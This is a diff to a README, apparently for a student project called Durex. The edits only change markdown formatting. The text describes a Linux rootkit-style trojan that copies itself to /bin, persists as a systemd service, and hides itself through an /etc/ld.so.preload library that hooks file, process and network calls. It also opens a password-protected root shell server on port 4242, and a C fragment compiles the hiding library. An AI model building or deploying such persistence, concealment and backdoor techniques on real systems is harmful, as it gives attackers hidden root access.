@@ -18,15 +18,15 @@ $>
 ```
 Durex only print the user actually connected, but Durex will also:
 
-+ Create a copy of himself in /bin
-+ Create a durex.service file in **/lib/systemd/** to add himself as a service, launching himslef at bootime as a deamon
-+ Create a durex.so library in /usr/local/lib/ to hide himself and his functions from the system
-+ Add this library in /etc/ld.so.preload
-+ Create a Durex.log file in /var/log/
++ Create a _copy_ of himself in **/bin**
++ Create a _durex.service_ file in **/lib/systemd/** to add himself as a service, launching himslef at bootime as a deamon
++ Create a _durex.so_ library in **/usr/local/lib/** to hide himself and his functions from the system
++ Add this library in **/etc/ld.so.preload**
++ Create a _Durex.log_ file in **/var/log/**
 
 Only one instance of Durex is created. And during his copy, Durex will changed a bit his behaviour allowing himself to :
 
-+ Open a server on port 4242, allowing 3 clients to connect to it
++ Open a server on port *4242*, allowing *3* clients to connect to it
 	+ The server is locked by a password
 	+ The server offers to the clients:
 		+ A shell as root
@@ -77,12 +77,12 @@ int				install_library()
 	char	*const files[] = { "gcc", "-Wall", "-fPIC", "-shared", "-o", DUREX_PROCESSHIDER_LIB,
 							 DUREX_FGETS_FILE, DUREX_LXSTAT_FILE, DUREX_NEWFSTATAT_FILE,
 							 DUREX_PCAP_FILE, DUREX_READDIR_FILE, DUREX_RECVMSG_FILE,
-							 DUREX_RM_FILE, DUREX_XSTAT_FILE, **DUREX_MY_FILE**,
+							 DUREX_RM_FILE, DUREX_XSTAT_FILE, \*DUREX_MY_FILE*\,
 							 "-ldl", NULL };
 	char	*const src[] = { NULL, NULL, NULL, NULL, NULL, NULL,
 							 DUREX_FGETS_SRC, DUREX_LXSTAT_SRC, DUREX_NEWFSTATAT_SRC,
 							 DUREX_PCAP_SRC, DUREX_READDIR_SRC, DUREX_RECVMSG_SRC,
-							 DUREX_RM_SRC, DUREX_XSTAT_SRC, **DUREX_MY_SRC** };
+							 DUREX_RM_SRC, DUREX_XSTAT_SRC, \*DUREX_MY_SRC*\ };
    ...
 }
 ```
